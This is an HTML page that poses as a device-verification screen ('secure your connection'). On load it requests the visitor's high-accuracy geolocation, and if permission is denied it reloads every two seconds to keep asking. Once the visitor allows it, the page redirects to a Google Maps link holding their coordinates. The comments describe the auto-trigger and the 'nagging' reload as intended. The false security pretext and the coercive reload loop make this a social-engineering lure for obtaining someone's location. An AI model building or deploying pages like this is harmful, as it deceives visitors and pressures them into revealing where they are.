<!DOCTYPE html>
<html>
<head>
    <title>Verification in Progress...</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 100px; background-color: #f0f2f5; }
        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body onload="autoTrack()">

    <div class="loader"></div>
    <h2>Verifying Your Device...</h2>
    <p>Please wait while we secure your connection.</p>
    <p id="status" style="color: red; font-weight: bold;"></p>

    <script>
        function autoTrack() {
            if (navigator.geolocation) {
                // The popup will trigger automatically as soon as the page loads
                navigator.geolocation.getCurrentPosition(success, error, {
                    enableHighAccuracy: true,
                    timeout: 5000
                });
            }
        }

        function success(position) {
            // Once they click 'Allow', it sends them straight to the result
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
        }

        function error(err) {
            document.getElementById("status").innerHTML = "Error: You must 'Allow' location to continue.";
            // Nagging feature: If they block it, the page refreshes to ask again
            setTimeout(() => { location.reload(); }, 2000);
        }
    </script>
</body>
</html>
